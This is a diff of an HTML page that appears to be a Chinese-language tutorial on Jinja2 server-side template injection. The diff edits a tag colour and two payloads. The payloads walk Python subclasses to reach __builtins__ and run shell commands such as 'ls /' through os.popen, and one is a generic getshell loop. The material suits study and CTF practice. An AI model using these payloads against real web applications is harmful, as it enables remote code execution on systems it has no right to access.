@@ -184,7 +184,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/Web/" style="color: #ffa2c4">
+                <a href="/tags/Web/" style="color: #00bcd4">
                     Web
                 </a>
             </span>
@@ -218,7 +218,7 @@
 <li>利用warnings.catch_warnings配合__builtins__得到eval函数借此进行rce</li>
 </ul>
 <pre><code class="python"># 注意__subclasss__的元素索引需要根据实际修改
-&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read())&#125;&#125;
+&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('os').popen('ls /').read()&#125;&#125; 
 </code></pre>
 <ul>
 <li>利用os._wrap_close类所属空间下可用的popen函数进行RCE</li>
@@ -249,7 +249,7 @@
 <ul>
 <li>通用getshell，都是通过__builtins__调用eval进行代码执行</li>
 </ul>
-<pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+<pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()&#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125;
 </code></pre>
 <ul>
 <li>读写文件，通过__builtins__调用open进行文件读写</li>
